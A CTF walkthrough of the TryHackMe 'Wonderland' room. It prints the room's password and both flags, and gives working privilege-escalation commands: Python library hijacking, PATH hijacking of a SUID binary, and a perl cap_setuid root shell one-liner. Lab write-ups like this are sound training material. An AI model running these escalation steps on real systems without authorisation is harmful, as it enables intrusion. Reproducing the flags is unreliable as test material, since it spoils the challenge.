# Wonderland - TryHackMe Walkthrough

**Target Machine:** 10.49.165.47

## 1. Enumeration
The process began with an Nmap scan to identify open ports and services.
- **Port 22:** SSH
- **Port 80:** HTTP (Golang server)

Exploring the website at `http://10.49.165.47/`, the homepage displayed "Follow the White Rabbit." Directory brute-forcing using Gobuster revealed a nested path: `/r/a/b/b/i/t/`.

Inspecting the HTML source of `http://10.49.165.47/r/a/b/b/i/t/` revealed hidden credentials:
- **User:** alice
- **Password:** `HowDothTheLittleCrocodileImproveHisShiningTail`

## 2. Initial Access (Alice)
Logging in via SSH as `alice`:
```bash
ssh alice@10.49.165.47
```
**User Flag:** In this room, the flags are "upside down." The user flag is located at `/root/user.txt`, which Alice can read.
- **Flag (user.txt):** `thm{“Curiouser and curiouser!”}`

## 3. Privilege Escalation: Alice → Rabbit
Checking sudo permissions (`sudo -l`) showed that Alice can run a Python script as user `rabbit`:
```bash
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Since the script imports the `random` library, I performed **Python Library Hijacking**:
1. Created `random.py` in `/home/alice/`:
   ```python
   import os
   os.system("/bin/bash")
   ```
2. Executed the sudo command:
   ```bash
   sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
   ```
Successfully gained a shell as **rabbit**.

## 4. Privilege Escalation: Rabbit → Hatter
In Rabbit's home directory, there is a SUID binary `teaParty`. Analyzing it with `strings` revealed it calls `date` without an absolute path.
**PATH Hijacking:**
1. Created a malicious `date` script in `/tmp`:
   ```bash
   echo '#!/bin/bash' > /tmp/date
   echo '/bin/bash' >> /tmp/date
   chmod +x /tmp/date
   ```
2. Added `/tmp` to the PATH: `export PATH=/tmp:$PATH`
3. Executed `/home/rabbit/teaParty` to get a shell as **hatter**.

Inside `/home/hatter/password.txt`, I found Hatter's SSH password.

## 5. Privilege Escalation: Hatter → Root
Checking for capabilities:
```bash
getcap -r / 2>/dev/null
```
Found `/usr/bin/perl` with `cap_setuid+ep`.
**Exploit:**
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
Successfully gained **root** access.

**Root Flag:** Located at `/home/alice/root.txt`.
- **Flag (root.txt):** `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}`
